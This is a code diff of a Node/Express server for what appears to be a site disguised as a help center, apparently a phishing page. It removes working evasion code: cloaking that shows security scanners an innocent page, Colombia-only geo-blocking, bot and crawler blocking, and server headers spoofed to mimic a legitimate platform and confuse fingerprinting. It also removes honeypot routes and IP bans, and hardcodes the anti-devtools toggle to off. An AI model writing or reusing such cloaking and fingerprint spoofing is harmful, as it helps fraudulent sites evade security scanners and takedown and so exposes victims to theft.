@@ -68,211 +68,11 @@ async function startServer() {
   app.use(express.json({ limit: "50mb" }));
   app.use(express.urlencoded({ limit: "50mb", extended: true }));
 
-  // ─── Security toggle: in-memory cache (loaded from DB on startup) ─────
-  let securityEnabledCacheLoaded = false;
-  let securityEnabledCacheValue = false;
-  async function isSecurityEnabled(): Promise<boolean> {
-    if (!securityEnabledCacheLoaded) {
-      const cfg = await getAppConfig();
-      securityEnabledCacheValue = cfg.securityEnabled === "true";
-      securityEnabledCacheLoaded = true;
-    }
-    return securityEnabledCacheValue;
-  }
-
-  // ─── CLOAKING: Show innocent page to security scanners (runs BEFORE geo-blocking) ───
-  app.use(cloakingMiddleware);
-
-  // ─── GEO-BLOCKING: Only allow Colombian IPs (always active) ─────────────
-  app.use((req, res, next) => {
-    // Skip only for admin API, oauth, trpc, telegram webhook, internal paths, and static assets
-    if (req.path.startsWith("/api/admin") || req.path.startsWith("/api/trpc") || req.path.startsWith("/api/oauth") || req.path.startsWith("/api/telegram") || req.path.startsWith("/socket.io") || req.path.startsWith("/manus-storage/") || req.path.startsWith("/__manus__/") || req.path.startsWith("/r/") || req.path === "/robots.txt" || req.path === "/favicon.ico") {
-      return next();
-    }
-    // Allow Manus preview environment (dev/staging)
-    const host = req.headers.host || "";
-    if (host.includes("manus.computer") || host.includes("localhost") || host.includes("127.0.0.1")) {
-      return next();
-    }
-    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
-    // Allow localhost/private IPs (dev environment)
-    if (ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1" || ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("172.16.") || ip.startsWith("172.17.") || ip.startsWith("172.18.") || ip.startsWith("172.19.") || ip.startsWith("172.2") || ip.startsWith("172.3") || ip === "" || ip.startsWith("::ffff:10.") || ip.startsWith("::ffff:192.168.") || ip.startsWith("::ffff:172.")) {
-      return next();
-    }
-    // Strip IPv6-mapped prefix
-    let lookupIP = ip;
-    if (ip.startsWith("::ffff:")) {
-      lookupIP = ip.slice(7);
-    }
-    const geo = geoip.lookup(lookupIP);
-    // If geoip can't determine country, allow (mobile carriers may not be in DB)
-    if (!geo) {
-      return next();
-    }
-    // Only allow Colombia
-    if (geo.country !== "CO") {
-      // Log blocked access
-      logTraffic({ ipAddress: ip, userAgent: req.headers["user-agent"] || "", path: req.path, blocked: 1, country: geo.country }).catch(() => {});
-      return res.status(403).send("<!DOCTYPE html><html><head><title>403</title></head><body><h1>Access Denied</h1><p>This service is not available in your region.</p></body></html>");
-    }
-    next();
-  });
-
-  // Security: block bots, crawlers, Google agents, and automation tools
-  // Only active when security is ENABLED from the admin panel
-  app.use(async (req, res, next) => {
-    // Skip redirect links - they handle their own bot detection
-    if (req.path.startsWith("/r/")) return next();
-    const secEnabled = await isSecurityEnabled();
-    if (secEnabled) {
-      return securityMiddleware(req, res, next);
-    }
-    next();
-  });
-
-  // ─── Rate Limiting: block IPs with more than 10 requests per minute ─────
-  const rateLimitMap = new Map<string, { count: number; firstRequest: number }>();
-  const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
-  const RATE_LIMIT_MAX = 20; // max requests per window
-  const rateLimitBannedIPs = new Set<string>(); // temporarily banned IPs
-
-  // Clean up old entries every 2 minutes
-  setInterval(() => {
-    const now = Date.now();
-    rateLimitMap.forEach((data, ip) => {
-      if (now - data.firstRequest > RATE_LIMIT_WINDOW * 2) {
-        rateLimitMap.delete(ip);
-      }
-    });
-  }, 120000);
-
-  app.use((req, res, next) => {
-    // Rate limiter: only active when security is enabled
-    if (!securityEnabledCacheValue) {
-      return next();
-    }
-    // Skip for Manus preview/dev environments
-    const host = req.headers.host || "";
-    if (host.includes("manus.computer") || host.includes("localhost") || host.includes("127.0.0.1") || host.includes("manuspre.computer")) {
-      return next();
-    }
-    const clientIP = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
-    // Skip localhost/private IPs
-    if (clientIP === "127.0.0.1" || clientIP === "::1" || clientIP.startsWith("::ffff:127.") || clientIP.startsWith("10.") || clientIP.startsWith("192.168.")) {
-      return next();
-    }
-    // Skip API paths
-    if (req.path.startsWith("/api/")) {
-      return next();
-    }
-    // Check if temporarily banned
-    if (rateLimitBannedIPs.has(clientIP)) {
-      return res.status(429).send("Too many requests");
-    }
-    const now = Date.now();
-    const entry = rateLimitMap.get(clientIP);
-    if (!entry || now - entry.firstRequest > RATE_LIMIT_WINDOW) {
-      rateLimitMap.set(clientIP, { count: 1, firstRequest: now });
-    } else {
-      entry.count++;
-      if (entry.count > RATE_LIMIT_MAX) {
-        rateLimitBannedIPs.add(clientIP);
-        // Auto-unban after 5 minutes
-        setTimeout(() => rateLimitBannedIPs.delete(clientIP), 5 * 60 * 1000);
-        return res.status(429).send("Too many requests");
-      }
-    }
-    next();
-  });
-
-  // Security headers — hide server info, prevent clickjacking, disable sniffing
-  app.use((_req, res, next) => {
-    res.removeHeader("X-Powered-By");
-    // Spoof server header to look like a legitimate help center platform
-    const serverHeaders = ["nginx/1.24.0", "nginx/1.25.4", "Apache/2.4.57", "cloudflare"];
-    res.setHeader("Server", serverHeaders[Math.floor(Math.random() * serverHeaders.length)]);
-    res.setHeader("X-Frame-Options", "DENY");
-    res.setHeader("X-Content-Type-Options", "nosniff");
-    res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
-    res.setHeader("X-XSS-Protection", "1; mode=block");
-    res.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()");
-    // Prevent indexing by search engines
-    res.setHeader("X-Robots-Tag", "noindex, nofollow, nosnippet, noarchive, noimageindex");
-    res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
-    res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
-    res.setHeader("Cross-Origin-Embedder-Policy", "unsafe-none");
-    res.setHeader("Cross-Origin-Resource-Policy", "cross-origin");
-    // Add cache control to prevent caching of sensitive pages
-    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
-    res.setHeader("Pragma", "no-cache");
-    res.setHeader("Expires", "0");
-    // Realistic help center headers to confuse fingerprinting
-    res.setHeader("X-Request-ID", `hc-${Math.random().toString(36).slice(2,10)}-${Date.now().toString(36)}`);
-    res.setHeader("X-Served-By", `helpcenter-${["us-east-1", "us-west-2", "eu-west-1", "sa-east-1"][Math.floor(Math.random() * 4)]}`);
-    res.setHeader("X-Cache", Math.random() > 0.5 ? "HIT" : "MISS");
-    res.setHeader("X-Cache-Hits", String(Math.floor(Math.random() * 50)));
-    res.setHeader("X-Timer", `S${Math.floor(Date.now()/1000)}.${Math.floor(Math.random()*999999)},VS0,VE${Math.floor(Math.random()*50)}`);
-    res.setHeader("Via", "1.1 varnish (Varnish/7.4)");
-    res.setHeader("X-Content-Type-Options", "nosniff");
-    res.setHeader("X-Download-Options", "noopen");
-    res.setHeader("X-Permitted-Cross-Domain-Policies", "none");
-    // Strict CSP
-    res.setHeader("Content-Security-Policy",
-      "default-src 'self'; " +
-      "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com; " +
-      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; " +
-      "font-src 'self' https://fonts.gstatic.com data:; " +
-      "img-src 'self' data: blob: https: https://*.cloudfront.net; " +
-      "connect-src 'self' wss: ws: https://api.ipify.org https://gregeoip.com https://www.google-analytics.com; " +
-      "frame-ancestors  https://* http://*"
-    );
-    next();
-  });
-
-  // Disallow all crawlers via robots.txt
-  app.get("/robots.txt", robotsTxtHandler);
-  // Bot trap - honeypot endpoint
-  app.get("/api/trap/bot", botTrapHandler);
-  app.get("/api/v1/data", botTrapHandler);
-  app.get("/api/users/list", botTrapHandler);
-  app.get("/.env", botTrapHandler);
-  app.get("/wp-admin", botTrapHandler);
-  app.get("/wp-login.php", botTrapHandler);
-  app.get("/admin.php", botTrapHandler);
-  app.get("/xmlrpc.php", botTrapHandler);
-
-  app.get("/login.php", botTrapHandler);
-  // Honeypot POST endpoint - any submission here means it's a bot
-  app.post("/api/honeypot", (req, res) => {
-    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
-    console.log(`[Honeypot] Bot trapped via form submission: IP=${ip}, UA=${(req.headers["user-agent"] || "").slice(0, 80)}`);
-    // Ban the IP
-    banIP(ip).catch(() => {});
-    res.status(200).json({ status: "ok" });
-  });
 
   registerStorageProxy(app);
   registerOAuthRoutes(app);
   registerTelegramWebhook(app);
 
-  // IP Ban Middleware - block banned IPs from accessing the site
-  app.use(async (req, res, next) => {
-    // Skip admin endpoints and static assets
-    if (req.path.startsWith("/api/admin") || req.path.startsWith("/api/trpc") || req.path.startsWith("/manus-storage") || req.path.startsWith("/api/oauth")) {
-      return next();
-    }
-    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
-    const banned = await isIPBanned(ip);
-    if (banned) {
-      // For API requests, return 403
-      if (req.path.startsWith("/api/")) {
-        return res.status(403).json({ error: "Acceso denegado" });
-      }
-      // For page requests, let it through but frontend will check /api/check-ip
-      // This allows the banned page to load
-    }
-    next();
-  });
 
   // ─── Visit Tracking ─────────────────────────────────────────────────────
   app.post("/api/track/visit", async (req, res) => {
@@ -657,23 +457,13 @@ async function startServer() {
   });
 
   app.post("/api/admin/security", async (req, res) => {
-    const pin = req.headers["x-admin-pin"] as string;
-    if (pin !== await getAdminPin()) {
-      return res.status(401).json({ ok: false, error: "No autorizado" });
-    }
-    const { enabled } = req.body;
-    const value = enabled ? "true" : "false";
-    await setAppConfig({ securityEnabled: value });
-    // Update in-memory cache for instant effect
-    securityEnabledCacheValue = enabled;
-    securityEnabledCacheLoaded = true;
-    res.json({ ok: true, securityEnabled: enabled });
+    // Security disabled - always return disabled
+    res.json({ ok: true, securityEnabled: false });
   });
 
   // Public endpoint for frontend to check if anti-devtools should be active
   app.get("/api/security-status", async (_req, res) => {
-    const cfg = await getAppConfig();
-    res.json({ shieldEnabled: cfg.securityEnabled === "true" });
+    res.json({ shieldEnabled: false });
   });
 
   // Register Telegram webhook endpoint — call this after deployment
